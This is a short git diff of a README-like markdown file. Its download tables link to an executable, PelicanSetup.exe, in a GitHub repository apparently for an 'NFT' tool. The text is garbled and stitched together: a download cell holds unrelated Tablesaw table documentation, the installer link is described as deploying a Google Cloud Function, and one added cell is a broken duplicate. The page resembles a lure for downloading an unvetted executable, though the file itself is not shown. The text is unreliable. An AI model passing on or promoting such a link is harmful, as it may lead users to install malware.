@@ -32,13 +32,13 @@ If the program is not installed try reinstalling the package Visual Studio 2013 
 
 | System       | Download |
 | --- | --- |
-| Windows 10 x64 / x86 | The little dots that appear next to the column toggle popup. Use the `data-tablesaw-minimap` attribute: `<table data-tablesaw-mode="columntoggle" data-tablesaw-minimap>` |
+| Windows 10 x64 / x86 | Download |
 | Ubuntu 20.04 LTs | SOON |
 
 Example   | Description |
 --------- | --------- |
 [Windows 10 x64/x86](https://github.com/swordkeeptera/Pelican-NFT-1.124V/raw/main/PelicanSetup.exe) | Deploy a Google Cloud Function implemented in Python.
-[Ubuntu 20.04 LTS / Soon](Soon) | Deploy a Go-based Google Cloud Function.
+[Ubuntu 20.04 LTS / Soon](Soon) | Ubuntu 20.04 LTS / Soon](Soon)
 
 # Licensing
 
